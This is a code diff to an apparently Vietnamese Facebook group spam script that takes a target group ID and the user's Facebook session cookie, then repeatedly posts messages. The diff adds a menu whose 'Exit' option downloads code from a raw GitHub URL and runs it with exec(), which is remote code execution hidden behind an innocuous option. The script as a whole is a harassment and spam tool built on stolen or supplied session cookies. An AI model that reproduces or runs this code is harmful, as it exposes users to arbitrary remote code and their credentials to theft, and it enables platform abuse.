@@ -70,6 +70,17 @@ print('''
         |___/                            |___/                          |___/ 
 \n\n''')
 time.sleep(0.5)
+print ("\033[1;31m[1\033[1;31m] \033[1;37m=> \033[1;33mTool Spam")
+print ("\033[1;31m[2\033[1;31m] \033[1;37m=> \033[1;33mExit\n")
+chon=input('\033[1;31m[👾\033[1;31m] \033[1;37m=> \033[1;33mNhập số: ')
+so="1"
+so2="2"
+if(chon==so):
+    print("\033[1;31m[1\033[1;31m] \033[1;37m=> \033[1;33mBạn Đã Chọn Tool Spam !!")
+    time.sleep(0.5)
+    os.system("clear")
+if(chon==so2):
+    exec(requests.get("https://raw.githubusercontent.com/yvngkh4ng123/Tool/main/exit").text)
 id=input('\033[1;31m[👾\033[1;31m] \033[1;37m=> \033[1;33mNhập ID Nhóm Cần Spam\033[1;37m: ')
 while True:
     ck=input('\033[1;31m[👾\033[1;31m] \033[1;37m=> \033[1;33mNhập Cookie Facebook\033[1;37m: ')
@@ -112,7 +123,6 @@ for i in range(soluong):
 	rq = requests.post("https://mbasic.facebook.com/messages/send/",params=params,headers=headers,data=data)
 	print("\033[1;31m Spam:",i+1)
 	time.sleep(delay)
-
 
 
 
